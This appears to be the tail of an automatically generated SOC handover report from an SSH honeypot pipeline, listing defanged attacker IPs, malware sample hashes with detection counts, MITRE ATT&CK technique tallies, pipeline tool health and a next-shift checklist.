| `120.211.5[.]35` | 1 | 2026-03-21 13:57 | 2026-03-21 13:57 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.170.100[.]253` | 1 | 2026-03-21 14:22 | 2026-03-21 14:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.15.59[.]126` | 1 | 2026-03-21 12:58 | 2026-03-21 12:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.47[.]61` | 1 | 2026-03-21 13:25 | 2026-03-21 13:25 | 8s | 0 | `T1592` | 🟢 LOW |
| `183.82.108[.]109` | 1 | 2026-03-21 12:43 | 2026-03-21 12:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.133.154[.]194` | 1 | 2026-03-21 13:15 | 2026-03-21 13:15 | 14s | 0 | `T1592` | 🟢 LOW |
| `221.159.21[.]170` | 1 | 2026-03-21 13:42 | 2026-03-21 13:43 | 74s | 0 | `T1592` | 🟢 LOW |
| `3.81.230[.]20` | 1 | 2026-03-21 12:55 | 2026-03-21 12:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]20` | 1 | 2026-03-21 14:02 | 2026-03-21 14:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `157.15.59[.]120` | NP | Global Trading And IT Solution Pvt. Ltd. | **100** ⚠️ | 2 |
| `49.124.151[.]20` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 15 |
| `122.170.100[.]253` | IN | ABTS-MUMBAI | **100** ⚠️ | 48 |
| `14.103.102[.]130` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 30 |
| `218.87.21[.]146` | CN | CHINANET jiangxi province network | **100** ⚠️ | 31 |
| `183.82.108[.]109` | IN | ACT HYD | **100** ⚠️ | 8 |
| `3.81.230[.]20` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 10 |
| `120.198.138[.]185` | CN | China Mobile Communications Corporation | **100** ⚠️ | 30 |
| `49.43.32[.]40` | IN | Reliance Jio Infocomm Limited | **100** ⚠️ | 1 |
| `120.62.8[.]17` | IN | Mahanagar Telephone Nigam Limited | **100** ⚠️ | 49 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 70 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 51 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 74 cases |
| Tool 34  | Credential Extractor        | ✅ 65 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 15 recon entry/entries in table (4 group(s) consolidating 47 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-21T14:25:10Z_
